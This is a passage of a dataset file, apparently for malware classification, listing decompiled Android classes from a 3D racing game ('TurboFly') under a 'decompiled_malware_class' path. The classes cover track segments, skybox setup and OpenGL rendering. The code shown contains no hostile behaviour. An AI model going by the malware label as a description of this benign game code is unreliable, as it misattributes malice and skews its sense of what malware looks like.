}  else       if (InGame.mode != 2) {         if (Math.random() > (InGame.multi ? 0.5d : 0.95d) && boost[1].z + 70 < z && z > 15) {           miss.setZ(z);           boost[1].setZ(z - 2);           boost[2].setZ(z - 4);         }       }     }     currentSegment=segment;   }   private static void sectionTypeMAJ(){     currentType=currentSequence.types[pos];     pos++;     if (pos == currentSequence.finRepeat) {       repeat++;       pos=currentSequence.debutRepeat;     }   }   private static void sectionTypeMAJRandom(){     currentType=currentSequence.types[pos];     if (nbRepeatToDo == 0) {       nbRepeatToDo=((int)(Math.random() * (currentSequence.maxRepeat - currentSequence.minRepeat))) + currentSequence.minRepeat;     }     pos++;     if (pos == currentSequence.finRepeat && repeat < nbRepeatToDo) {       repeat++;       pos=currentSequence.debutRepeat;     }  else     if (pos == currentSequence.size) {       int rand=(int)(Math.random() * currentSequence.compatiblesSuites.size());       currentSequence=(Sequence)currentSequence.compatiblesSuites.get(rand);       pos=0;       repeat=0;       nbRepeatToDo=((int)(Math.random() * (currentSequence.maxRepeat - currentSequence.minRepeat))) + currentSequence.minRepeat;     }   }   private static void directionMAJ(){     if (currentSize == 0) {       if (lines[currentLine][0] != -1.0d) {         currentDirection.x=lines[currentLine][3];         currentDirection.y=lines[currentLine][4];         currentSize=(int)lines[currentLine][0];         currentDecY=lines[currentLine][1];         if (currentDecY != 0.0d || currentLine == 0 || ((int)lines[currentLine - 1][2]) != ((int)lines[currentLine][2])) {           currentSequence=Sequence.sequences[(int)lines[currentLine][2]];           pos=0;         }         currentMin=lines[currentLine][5];         currentMax=lines[currentLine][6];         currentLine++;       }  else {         return;       }     }     currentSize--;   }   private static void directionMAJRandom(){     currentDirection.x+=(Math.random() - 0.5d) * 0.01d;     currentDirection.x=Math.max(Math.min(0.05d,currentDirection.x),-0.05d);     if (Math.random() > 0.98d) {       currentDirection.x=0.05d;     }     if (Math.random() > 0.98d) {       currentDirection.x=-0.05d;     }     if (Math.random() > 0.97d) {       currentDirection.x=0.0d;     }     if (!pente && longueurMonte == 0 && Math.random() > 0.9d && currentSegment != null) {       targetY=((Math.random() * (currentSequence.maxY - currentSequence.minY)) + currentSequence.minY) * 122880.0d;       initialY=currentSegment.point1.y;       middleY=(targetY + initialY) / 2.0d;       monte=false;       descend=false;       if (initialY < targetY) {         monte=true;         pente=true;         courbePente=Math.random() * 0.5d * 0.08d;       }  else       if (initialY > targetY) {         descend=true;         pente=true;         courbePente=(-(Math.random() * 0.5d)) * 0.08d;       }       longueurMonte=0;     }     if (pente) {       if ((monte && courbePente > 0.0d && currentSegment.point1.y >= middleY) || (descend && courbePente < 0.0d && currentSegment.point1.y <= middleY)) {         courbePente=-courbePente;         pente=false;       }  else {         longueurMonte++;       }     }  else     if (longueurMonte > 0) {       longueurMonte--;       if (longueurMonte == 0) {         courbePente=0.0d;       }     }     currentDirection.y=courbePente;     monteGlobale+=courbePente;   }   public static Segment getSegments(  int z){     if (precalc) {       if (z < 0 || z >= precalculated.length) {         return segmentStandard;       }       return precalculated[z];     }     if (z < playerZ - 2 || z >= (playerZ - 2) + nbSegments || z <= -1) {       return segmentStandard;     }     return null;   }   public static void playerIsThereNow(  int z){     playerZ=z;     if (precalc) {       getSegments((z - 3) + nbSegments).activateTrucs();       if (getSegments((z - 3) + nbSegments).trucsDessus.contains(boost[2])) {         boost[0].majRelXYZ((Math.random() - 0.5d) * 4.5d,-0.04d,0.0d);         miss.majRelXYZ(boost[0].centerR.x,-0.04d,0.0d);         boost[1].majRelXYZ(boost[0].centerR.x,-0.04d,0.0d);         boost[2].majRelXYZ(boost[0].centerR.x,-0.04d,0.0d);       }     }     GLES10.glFogfv(2918,getSegments(z + 20).getFog(0.0f),0);   }   public static void createSkyBox(  int texture){     skybox=new Model3D(20,10,texture);     skybox.setScale(3,-3,3,10922,65536);     skybox.putPoint(-65536,-65536,-65536,1,0);     skybox.putPoint(-65536,65536,-65536,1,1);     skybox.putPoint(-65536,-65536,65536,0,0);     skybox.putPoint(-65536,65536,65536,0,1);     skybox.putTriangle(0,1,2);     skybox.putTriangle(1,3,2);     skybox.putPoint(65536,-65536,-65536,2,0);     skybox.putPoint(65536,-65536,65536,3,0);     skybox.putPoint(65536,65536,-65536,2,1);     skybox.putPoint(65536,65536,65536,3,1);     skybox.putTriangle(4,5,6);     skybox.putTriangle(5,7,6);     skybox.putPoint(-65536,-65536,-65536,6,1);     skybox.putPoint(-65536,-65536,65536,5,1);     skybox.putPoint(65536,-65536,-65536,6,0);     skybox.putPoint(65536,-65536,65536,5,0);     skybox.putTriangle(8,9,10);     skybox.putTriangle(9,11,10);     skybox.putPoint(-65536,-65536,-65536,1,0);     skybox.putPoint(65536,-65536,-65536,2,0);     skybox.putPoint(-65536,65536,-65536,1,1);     skybox.putPoint(65536,65536,-65536,2,1);     skybox.putTriangle(12,13,14);     skybox.putTriangle(13,15,14);     skybox.putPoint(-65536,-65536,65536,4,0);     skybox.putPoint(-65536,65536,65536,4,1);     skybox.putPoint(65536,-65536,65536,3,0);     skybox.putPoint(65536,65536,65536,3,1);     skybox.putTriangle(16,17,18);     skybox.putTriangle(17,19,18);     skybox.finishUp();     skybox.clockWise();   }   public static void clearColor(){     if (level == 1) {       GLES10.glClearColor(0.6392157f,0.7411765f,0.9098039f,1.0f);       return;     }     if (level == 2) {       GLES10.glClearColor(0.0f,0.0f,0.0f,1.0f);       return;     }     if (level == 3) {       GLES10.glClearColor(0.12156863f,0.20784314f,0.16078432f,1.0f);       return;     }     if (level == 4) {       GLES10.glClearColor(0.0f,0.0f,0.0f,1.0f);       return;     }     if (level == 5) {       GLES10.glClearColor(0.5294118f,0.63529414f,0.7176471f,1.0f);     }  else     if (level == 6) {       GLES10.glClearColor(0.4627451f,0.8392157f,0.5529412f,1.0f);     }  else     if (level == 7) {       GLES10.glClearColor(1.0f,1.0f,1.0f,1.0f);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Rect3D.code","public class Rect3D extends Model3D {   public Rect3D(  int x1,  int y1,  int z1,  int x2,  int y2,  int z2,  int texture){     super(4,2,texture);     setScale(3840,3840,5402,1024,1024);     putPoint(x1,y1,z1,0,64);     putPoint(x2,y1,z1,64,64);     putPoint(x1,y2,z2,0,0);     putPoint(x2,y2,z2,64,0);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   public Rect3D(  int largeur,  int longueur,  int texture){     super(4,2,texture);     setScale(3840,3840,5402,1024,1024);     putPoint((-largeur) / 2,0,16 - (longueur / 2),0,64);     putPoint(largeur / 2,0,16 - (longueur / 2),64,64);     putPoint((-largeur) / 2,0,(longueur / 2) + 16,0,0);     putPoint(largeur / 2,0,(longueur / 2) + 16,64,0);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   public Rect3D(  int xPos,  int yPos,  int zPos,  int hauteur,  int longueur,  int texture){     super(4,2,texture);     setScale(3840,3840,5402,1024,1024);     putPoint(xPos,yPos - (hauteur / 2),(zPos + 16) - (longueur / 2),0,0);     putPoint(xPos,yPos + (hauteur / 2),(zPos + 16) - (longueur / 2),0,64);     putPoint(xPos,yPos - (hauteur / 2),zPos + 16 + (longueur / 2),64,0);     putPoint(xPos,yPos + (hauteur / 2),zPos + 16 + (longueur / 2),64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   public Rect3D(  int xPos,  int yPos,  int zPos,  int hauteur,  int longueur,  int texture,  boolean thatsForExplosionsAndSuch){     super(4,2,texture);     setScale(3840,3840,5402,1024,1024);     putPoint(xPos - (longueur / 2),yPos - (hauteur / 2),zPos,0,0);     putPoint(xPos - (longueur / 2),yPos + (hauteur / 2),zPos,0,64);     putPoint(xPos + (longueur / 2),yPos - (hauteur / 2),zPos,64,0);     putPoint(xPos + (longueur / 2),yPos + (hauteur / 2),zPos,64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   @Override public void draw(){     GLES10.glDisable(2884);     super.draw();     GLES10.glEnable(2884);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\SectionType.code","public class SectionType extends Model3D {   public static final int ABSOLUTE=0;   public static final int V0=10;   public static final int V1=11;   public static final int V2=12;   public static final int Y0=1;   public static final int YC=5;   public float[] ambient;   public double[] coordsX;   public double[] coordsY;   public boolean creeParModel;   public float[] diffuse;   public float[] fogColor;   public boolean hasBorderN;   public boolean hasBorderP;   public boolean mursSimples;   public int nbPointsReal;   public boolean solsSimples;   public float[] specular;   public int[] typeY;   public static float[] black={0.0f,0.0f,0.0f,1.0f};   public static float[] graydiffuse={0.5f,0.5f,0.5f,1.0f};   public static float[] grayspecular={2.0f,2.0f,2.0f,1.0f};   public static float[] whiteambient={1.8f,1.8f,1.8f,1.0f};   public static float[] deffogColor={0.16862746f,0.16862746f,0.16862746f,1.0f};   public static float[] defdiffuse={1.5f,1.5f,1.5f,1.0f};   public static float[] defspecular={4.0f,4.0f,4.0f,1.0f};   public static float[] defambient={1.8f,1.8f,1.8f,1.0f};   public void setFog(  float[] _fogColor){     this.fogColor=_fogColor;   }   public SectionType(  int nbPointsReal,  double[] coordsX2,  double[] coordsY2,  short[] indices,  int[] texCoords){     super(nbPointsReal * 2,indices.length / 3,0);     this.mursSimples=true;     this.solsSimples=true;     this.hasBorderP=true;     this.hasBorderN=true;     this.creeParModel=false;     this.fogColor=deffogColor;     this.diffuse=defdiffuse;     this.specular=defspecular;     this.ambient=defambient;     clockWise();     this.nbPointsReal=nbPointsReal;     this.coordsX=coordsX2;     this.coordsY=coordsY2;     buildIndexBuffer(indices);     buildTexBuffer(texCoords);     setNbTrianglesToDraw(indices.length / 3);     finishUp();   }   private void buildIndexBuffer(  short[] indices){     this.mIndexBuffer.put(indices);   }   private void buildTexBuffer(  int[] coords){     this.mTexBuffer.put(coords);   }   @Override public void finishUp(){     this.mIndexBuffer.position(0);     this.mTexBuffer.position(0);     if (doYaWannaUzDaVBOz()) {       this.mVertexBuffer.position(0);       this.mTexBuffer.position(0);       GLES11.glBindBuffer(34963,this.index_object);       GLES11.glBufferData(34963,this.nbTrianglesToDraw * 3 * 2,this.mIndexBuffer,35044);       GLES11.glBindBuffer(34963,0);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\SectionTypesBuilder.code","public class SectionTypesBuilder {   public static final int ABSOLUTE=0;   public static final int V0=10;   public static final int V1=11;   public static final int V2=12;   public static final int Y0=1;   public static final int YC=5;   public static int[] textures;   public static void init(){   }   public static SectionType buildST(  double[] coordsX,  double[] coordsY,  int[] texX,  float[] texY,  int[] finSeg,  float[] fogColor){     return buildST(coordsX,coordsY,new int[coordsY.length],texX,texY,finSeg,fogColor);   }   public static SectionType buildST(  double[] coordsX,  double[] coordsY,  int[] typeY,  int[] texX,  float[] texY,  int[] finSeg,  float[] fogColor){     int nbPoints=coordsX.length;     int nbFaces=finSeg.length;     for (int j=0; j < finSeg.length; j++) {       if (finSeg[j] == 1 || finSeg[j] == 3) {         nbFaces--;       }     }     int[] texCoords=new int[nbPoints * 2 * 2];     for (int i=0; i < nbPoints; i++) {       int pos=(texX[i] * 65536) / 16;       texCoords[i * 4]=pos;       texCoords[(i * 4) + 1]=(int)(texY[i] * 65536.0f);       texCoords[(i * 4) + 2]=pos;       texCoords[(i * 4) + 3]=0;     }     short[] indices=new short[nbFaces * 6];     int n=0;     int k=0;     int l=0;     int j2=0;     while (j2 < finSeg.length) {       if (finSeg[j2] == 2 || finSeg[j2] == 3) {         l++;       }       if (finSeg[j2] == 3 || finSeg[j2] == 1 || (j2 > 1 && (finSeg[j2 - 1] == 3 || finSeg[j2 - 1] == 1))) {         int factor=(finSeg[j2] == 2 || finSeg[j2] == 3) ? 2 : 1;         int signe=(j2 <= 1 || !(finSeg[j2 + (-1)] == 3 || finSeg[j2 + (-1)] == 1)) ? -1 : 1;         if ((signe == -1 && texX[l] > texX[l - factor]) || (signe == 1 && texX[l + factor] > texX[l])) {           int i2=l * 4;           texCoords[i2]=texCoords[i2] + (signe * 64);           int i3=(l * 4) + 2;           texCoords[i3]=texCoords[i3] + (signe * 64);           if (factor == 2) {             int i4=(l * 4) - 4;             texCoords[i4]=texCoords[i4] + (signe * 64);             int i5=((l * 4) + 2) - 4;             texCoords[i5]=texCoords[i5] + (signe * 64);           }         }  else {           int i6=l * 4;           texCoords[i6]=texCoords[i6] - (signe * 64);           int i7=(l * 4) + 2;           texCoords[i7]=texCoords[i7] - (signe * 64);           if (factor == 2) {             int i8=(l * 4) - 4;             texCoords[i8]=texCoords[i8] - (signe * 64);             int i9=((l * 4) + 2) - 4;             texCoords[i9]=texCoords[i9] - (signe * 64);           }         }       }       if (j2 > 1 && j2 < finSeg.length - 1 && finSeg[j2 - 1] == 0 && finSeg[j2] == 0) {         if (texX[l] > texX[l - 1] && texX[l + 1] < texX[l]) {           texCoords[l * 4]=texCoords[r3] - 64;           texCoords[(l * 4) + 2]=texCoords[r3] - 64;         }  else         if (texX[l] < texX[l - 1] && texX[l + 1] > texX[l]) {           int i10=l * 4;           texCoords[i10]=texCoords[i10] + 64;           int i11=(l * 4) + 2;           texCoords[i11]=texCoords[i11] + 64;         }       }       l++;       if (finSeg[j2] == 1) {         n+=2;       }  else       if (finSeg[j2] == 3) {         n+=4;       }  else       if (finSeg[j2] == 0) {         indices[k]=(short)(n + 1);         int k2=k + 1;         indices[k2]=(short)(n + 2);         int k3=k2 + 1;         indices[k3]=(short)n;         int k4=k3 + 1;         indices[k4]=(short)(n + 2);         int k5=k4 + 1;         indices[k5]=(short)(n + 1);         int k6=k5 + 1;         indices[k6]=(short)(n + 3);         k=k6 + 1;         n+=2;       }  else       if (finSeg[j2] == 2) {         indices[k]=(short)(n + 2);         int k7=k + 1;         indices[k7]=(short)(n + 4);         int k8=k7 + 1;         indices[k8]=(short)n;         int k9=k8 + 1;         indices[k9]=(short)(n + 4);         int k10=k9 + 1;         indices[k10]=(short)(n + 2);         int k11=k10 + 1;         indices[k11]=(short)(n + 6);         k=k11 + 1;         n+=4;       }       j2++;     }     SectionType st=new SectionType(nbPoints,coordsX,coordsY,indices,texCoords);     st.setFog(fogColor);     st.typeY=typeY;     return st;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Segment.code","public class Segment extends Model3D {   public static final int LARGEUR=6;   public static final int baseSizeX=122880;   public static final int baseSizeY=122880;   public static final int baseSizeZ=122880;   public static final int realSizeZ=172880;   public float angle;   public float angleDiffRelatif;   public float angleY;   public float angleZ;   public double[] coordsX;   public double[] coordsY;   public double decY;   public float diffAngle;   public float diffAngleY;   public float diffAngleZ;   public double diffY;   public Vector3 direction;   public Vector3 directionRaw;   public float[] hauteur1d;   public float[] hauteur1g;   public float[] hauteur2d;   public float[] hauteur2g;   public Vector3 i1;   public Vector3 i2;   public int id;   public Vector3 j1;   public Vector3 j2;   public Vector3 k;   public int lD;   public int lG;   public float[] mur1b;   public float[] mur1h;   public float[] murdb;   public float[] murdh;   public float[] murgb;   public float[] murgh;   public int nbPoints;   public int nbTriangles;   public Point3 o;   public Point3 point1;   public Point3 point2;   public Sequence sequence;   public double sizeN1;   public double sizeN2;   public double sizeP1;   public double sizeP2;   public int sizeX;   public int sizeZ;   public double specialTrucPos;   public Vector trucsDessus;   public SectionType type;   public int[] typeY;   public static final int MAX_NBPOINTS=256;   private static Point3[] points1=new Point3[MAX_NBPOINTS];   private static Point3[] points2=new Point3[MAX_NBPOINTS];   public void create(  SectionType _type,  Segment previous,  Vector3 _directionRaw,  double decY,  int z,  double v0_1,  double v1_1,  double v2_1,  double v0_2,  double v1_2,  double v2_2,  double yMin,  double yMax,  Sequence _sequence){     double coordsX1;     double coordsX2;     this.id=z;     this.trucsDessus.clear();     this.type=_type;     this.sequence=_sequence;     setTexture(this.type.getTexture());     this.decY=decY;     this.nbPoints=this.type.nbPointsReal;     this.coordsX=this.type.coordsX;     this.coordsY=this.type.coordsY;     this.typeY=this.type.typeY;     this.mIndexBuffer=this.type.mIndexBuffer;     this.mTexBuffer=this.type.mTexBuffer;     this.nbTriangles=this.type.nbTrianglesToDraw;     this.index_object=this.type.index_object;     this.tex_object=this.type.tex_object;     setNbTrianglesToDraw(this.nbTriangles);     this.directionRaw.set(_directionRaw);     if (previous == null) {       init();       for (int i=0; i < this.nbPoints; i++) {         points1[i].set(this.coordsX[i] * this.sizeX,((this.coordsY[i] + decY) - getYBase1(this.coordsX[i])) * 122880.0d,0.0d);       }     }  else {       this.point1.set(previous.point2);       this.j1.set(previous.j2);       this.i1.set(previous.i2);       this.point1.translate(this.j1,122880.0d * decY);       if (this.point1.y < yMin || this.point1.y > yMax) {         this.point1.translate(this.j1,(-decY) * 122880.0d);         this.decY=0.0d;       }       double middle1=(this.sizeN1 + this.sizeP1) / 2.0d;       for (int i2=0; i2 < this.nbPoints; i2++) {         if (this.coordsX[i2] <= -3.0d) {           coordsX1=this.coordsX[i2] + 3.0d + this.sizeN1;         }  else         if (this.coordsX[i2] >= 3.0d) {           coordsX1=(this.coordsX[i2] - 3.0d) + this.sizeP1;         }  else {           coordsX1=((this.coordsX[i2] / 6.0d) * (this.sizeP1 - this.sizeN1)) + middle1;         }         if (this.typeY[i2] == 0) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,this.coordsY[i2] * 122880.0d,points1[i2]);         }  else         if (this.typeY[i2] == 5) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,(this.coordsY[i2] + getYBase1(this.coordsX[i2])) * 122880.0d,points1[i2]);         }  else         if (this.typeY[i2] == 1) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]);           points1[i2].y=this.coordsY[i2] * 122880.0d;         }  else         if (this.typeY[i2] == 10) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,(this.coordsY[i2] + v0_1) * 122880.0d,points1[i2]);         }  else         if (this.typeY[i2] == 11) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,(this.coordsY[i2] + v1_1) * 122880.0d,points1[i2]);         }  else         if (this.typeY[i2] == 12) {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,(this.coordsY[i2] + v2_1) * 122880.0d,points1[i2]);         }  else {           this.point1.plus(this.i1,this.sizeX * coordsX1,points1[i2]).plus(this.j1,this.coordsY[i2] * 122880.0d,points1[i2]);         }       }     }     Vector3.product(this.i1,this.j1,this.k);     this.i1.normalize();     this.j1.normalize();     this.k.normalize();     Vector3.vectorInBase(this.directionRaw.normalize(),this.i1,this.j1,this.k,this.direction);     Vector3.product(this.direction,this.i1,this.j2);     this.j2.normalize();     this.point1.plus(this.direction,this.sizeZ,this.point2);     this.point2.y=Math.min(Math.max(this.point2.y,yMin),yMax);     this.i1.minus(this.direction,(-2.0d) * this.i1.dotProduct(this.direction),this.i2);     this.i2.y=0.0d;     this.i2.normalize();     double middle2=(this.sizeN2 + this.sizeP2) / 2.0d;     for (int i3=0; i3 < this.nbPoints; i3++) {       if (this.coordsX[i3] <= -3.0d) {         coordsX2=this.coordsX[i3] + 3.0d + this.sizeN2;       }  else       if (this.coordsX[i3] >= 3.0d) {         coordsX2=(this.coordsX[i3] - 3.0d) + this.sizeP2;       }  else {         coordsX2=((this.coordsX[i3] / 6.0d) * (this.sizeP2 - this.sizeN2)) + middle2;       }       if (this.typeY[i3] == 0) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,this.coordsY[i3] * 122880.0d,points2[i3]);       }  else       if (this.typeY[i3] == 5) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,(this.coordsY[i3] + getYBase2(this.coordsX[i3])) * 122880.0d,points2[i3]);       }  else       if (this.typeY[i3] == 1) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]);         points2[i3].y=this.coordsY[i3] * 122880.0d;       }  else       if (this.typeY[i3] == 10) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,(this.coordsY[i3] + v0_2) * 122880.0d,points2[i3]);       }  else       if (this.typeY[i3] == 11) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,(this.coordsY[i3] + v1_2) * 122880.0d,points2[i3]);       }  else       if (this.typeY[i3] == 12) {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,(this.coordsY[i3] + v2_2) * 122880.0d,points2[i3]);       }  else {         this.point2.plus(this.i2,this.sizeX * coordsX2,points2[i3]).plus(this.j2,this.coordsY[i3] * 122880.0d,points2[i3]);       }     }     createModel();     double sinAngle=this.i1.z;     double cosAngle=this.i1.x;     this.angle=(((float)(Math.signum(sinAngle) * Math.acos(cosAngle))) * 180.0f) / 3.1415f;     double sinAngle2=this.i2.z;     double cosAngle2=this.i2.x;     this.diffAngle=((((float)(Math.signum(sinAngle2) * Math.acos(cosAngle2))) * 180.0f) / 3.1415f) - this.angle;     while (this.angle > 180.0f) {       this.angle-=360.0f;     }     while (this.angle <= -180.0f) {       this.angle+=360.0f;     }     while (this.diffAngle > 180.0f) {       this.diffAngle-=360.0f;     }     while (this.diffAngle <= -180.0f) {       this.diffAngle+=360.0f;     }     double sinAngle3=((-this.j1.x) * this.i1.z) + (this.j1.z * this.i1.x);     double cosAngle3=this.j1.y;     this.angleY=((-((float)(Math.signum(sinAngle3) * Math.acos(cosAngle3)))) * 180.0f) / 3.1415f;     double sinAngle4=((-this.j2.x) * this.i2.z) + (this.j2.z * this.i2.x);     double cosAngle4=this.j2.y;     this.diffAngleY=(((-((float)(Math.signum(sinAngle4) * Math.acos(cosAngle4)))) * 180.0f) / 3.1415f) - this.angleY;     while (this.angleY > 180.0f) {       this.angleY-=360.0f;     }     while (this.angleY <= -180.0f) {       this.angleY+=360.0f;     }     while (this.diffAngleY > 180.0f) {       this.diffAngleY-=360.0f;     }     while (this.diffAngleY <= -180.0f) {       this.diffAngleY+=360.0f;     }     this.angleDiffRelatif=-((float)(Math.signum(this.directionRaw.x) * Math.abs((Math.asin(Vector3.product(this.i1,this.i2,Vector3.tmp).lenght()) * 180.0d) / 3.1414999961853027d)));     this.diffY=this.point2.y - this.point1.y;   }   public static void staticInit(){     for (int i=0; i < 256; i++) {       points1[i]=new Point3(0.0d,0.0d,0.0d);       points2[i]=new Point3(0.0d,0.0d,0.0d);     }   }   private void init(){     this.point1=new Point3(0.0d,0.0d,0.0d);     this.point2=new Point3(0.0d,0.0d,0.0d);     this.i1=new Vector3(1.0d,0.0d,0.0d);     this.i2=new Vector3(1.0d,0.0d,0.0d);     this.j1=new Vector3(0.0d,1.0d,0.0d);     this.j2=new Vector3(0.0d,1.0d,0.0d);     this.k=new Vector3(0.0d,0.0d,1.0d);     this.direction=new Vector3(0.0d,0.0d,1.0d);     this.directionRaw=new Vector3(0.0d,0.0d,1.0d);     this.trucsDessus=new Vector();   }   private float angle(  double Xa,  double Ya,  double Xb,  double Yb){     double Na=Math.sqrt((Xa * Xa) + (Ya * Ya));     double Nb=Math.sqrt((Xb * Xb) + (Yb * Yb));     double C=((Xa * Xb) + (Ya * Yb)) / (Na * Nb);     double S=(Xa * Yb) - (Ya * Xb);     return (((float)(Math.signum(S) * Math.acos(C))) * 180.0f) / 3.1415f;   }   public Segment(){     super(MAX_NBPOINTS,0,0);     this.sizeP1=3.0d;     this.sizeN1=-3.0d;     this.sizeP2=3.0d;     this.sizeN2=-3.0d;     this.specialTrucPos=0.0d;     this.hauteur1g=new float[8];     this.hauteur1d=new float[8];     this.hauteur2g=new float[8];     this.hauteur2d=new float[8];     this.mur1b=new float[8];     this.murgb=new float[8];     this.murdb=new float[8];     this.mur1h=new float[8];     this.murgh=new float[8];     this.murdh=new float[8];     clockWise();     this.sizeX=122880;     this.sizeZ=realSizeZ;     init();   }   private void createModel(){     for (int i=0; i < this.nbPoints; i++) {       if (doYaWannaUzDaVBOz()) {         this.mVBOVertexTexBuffer.put((int)points1[i].x);         this.mVBOVertexTexBuffer.put((int)points1[i].y);         this.mVBOVertexTexBuffer.put((int)points1[i].z);         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());         this.mVBOVertexTexBuffer.put((int)points2[i].x);         this.mVBOVertexTexBuffer.put((int)points2[i].y);         this.mVBOVertexTexBuffer.put((int)points2[i].z);         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());       }  else {         this.mVertexBuffer.put((int)points1[i].x);         this.mVertexBuffer.put((int)points1[i].y);         this.mVertexBuffer.put((int)points1[i].z);         this.mVertexBuffer.put((int)points2[i].x);         this.mVertexBuffer.put((int)points2[i].y);         this.mVertexBuffer.put((int)points2[i].z);       }     }     this.mTexBuffer.rewind();     if (!doYaWannaUzDaVBOz()) {       this.mVertexBuffer.rewind();     }     finishUp();   }   @Override public void createBuffers(){     if (doYaWannaUzDaVBOz()) {       ByteBuffer vbo=ByteBuffer.allocateDirect(5120);       vbo.order(ByteOrder.nativeOrder());       this.mVBOVertexTexBuffer=vbo.asIntBuffer();       int[] buffers=new int[1];       GLES11.glGenBuffers(1,buffers,0);       this.vertex_object=buffers[0];       return;     }     ByteBuffer vbb=ByteBuffer.allocateDirect(3072);     vbb.order(ByteOrder.nativeOrder());     this.mVertexBuffer=vbb.asIntBuffer();   }   public int getXPos(  double x,  double y,  double z){     return (int)((this.point2.x * z) + (this.point1.x * (1.0d - z)) + (this.i1.x * x * 122880.0d* (1.0d - z))+ (this.i2.x * x * 122880.0d* z)+ (this.j1.x * y * 122880.0d* (1.0d - z))+ (this.j2.x * y * 122880.0d* z));   }   public int getYPos(  double x,  double y,  double z){     return (int)((this.point2.y * z) + (this.point1.y * (1.0d - z)) + (this.i1.y * x * 122880.0d* (1.0d - z))+ (this.i2.y * x * 122880.0d* z)+ (this.j1.y * y * 122880.0d* (1.0d - z))+ (this.j2.y * y * 122880.0d* z));   }   public int getZPos(  double x,  double y,  double z){     return (int)((this.point2.z * z) + (this.point1.z * (1.0d - z)) + (this.i1.z * x * 122880.0d* (1.0d - z))+ (this.i2.z * x * 122880.0d* z)+ (this.j1.z * y * 122880.0d* (1.0d - z))+ (this.j2.z * y * 122880.0d* z));   }   public double relativeTailleZ(  float x){     return this.point2.plus(this.i2,x * 122880.0f,Point3.tmp).distance(this.point1.plus(this.i1,x * 122880.0f,Point3.tmp2)) / 122880.0d;   }   public float getAngle(  float mTz){     return (this.diffAngle * mTz) + this.angle;   }   public float getAngleY(  float mTz){     return (this.diffAngleY * mTz) + this.angleY;   }   public void translateToThisSegment(  float mTz,  float x,  float vangle,  float angleZ,  double yb,  float angleY){     float[] position={0.0f,0.6f,1.0f,0.0f};     GLES10.glLightfv(16384,4611,position,0);     GLES10.glTranslatex(0,0,(int)(65536.0d * (0.8d - Math.abs(0.05f * x))));     GLES10.glRotatef((-angleZ) / 2.0f,0.0f,0.0f,1.0f);     GLES10.glRotatef(vangle,0.0f,1.0f,0.0f);     GLES10.glRotatef(angleY,1.0f,0.0f,0.0f);     GLES10.glRotatef(getAngle(mTz),0.0f,1.0f,0.0f);     GLES10.glTranslatex(-getXPos(x,yb,mTz),-getYPos(x,yb,mTz),-getZPos(x,yb,mTz));   }   public void simpleTranslateToThisSegment(){     float[] position={0.0f,0.6f,1.0f,0.0f};     GLES10.glLightfv(16384,4611,position,0);     GLES10.glTranslatex(0,0,(int)(65536.0d * (0.8d - Math.abs(0.0f))));     GLES10.glRotatef(getAngleY(0.0f),1.0f,0.0f,0.0f);     GLES10.glRotatef(getAngle(0.0f),0.0f,1.0f,0.0f);     GLES10.glTranslatex(-getXPos(0.0d,0.0d,0.0d),-getYPos(0.0d,0.0d,0.0d),-getZPos(0.0d,0.0d,0.0d));   }   public float[] getFog(  float mTz){     return this.type.fogColor;   }   @Override public void finishUp(){     if (doYaWannaUzDaVBOz()) {       this.mVBOVertexTexBuffer.position(0);       GLES11.glBindBuffer(34962,this.vertex_object);       GLES11.glBufferData(34962,this.nbPoints * 2 * 5* 4,this.mVBOVertexTexBuffer,35044);       GLES11.glBindBuffer(34962,0);       return;     }     super.finishUp();   }   public void drawTrucs(  boolean isStatic){     if (this.id != -1) {       for (int i=0; i < this.trucsDessus.size(); i++) {         Truc truc=(Truc)this.trucsDessus.get(i);         truc.segment=this;         if (isStatic) {           truc.drawTransparentPart();         }  else         if (!isStatic) {           truc.draw();         }       }     }   }   public double getYBase1(  double x){     return 0.0d;   }   public double getYBase2(  double x){     return 0.0d;   }   public float getYBase(  double x,  double z){     return (float)((getYBase1(x) * (1.0d - z)) + (getYBase2(x) * z));   }   public double getSizeP(  double z){     return (this.sizeP1 * (1.0d - z)) + (this.sizeP2 * z);   }   public double getSizeN(  double z){     return (this.sizeN1 * (1.0d - z)) + (this.sizeN2 * z);   }   @Override public void draw(){     if (this.id > -1) {       super.draw();       GLES10.glDisable(2896);     }   }   public void activateTrucs(){     if (this.id > -1) {       for (int i=0; i < this.trucsDessus.size(); i++) {         Truc truc=(Truc)this.trucsDessus.get(i);         truc.segment=this;         truc.z=this.id;       }     }   } } "
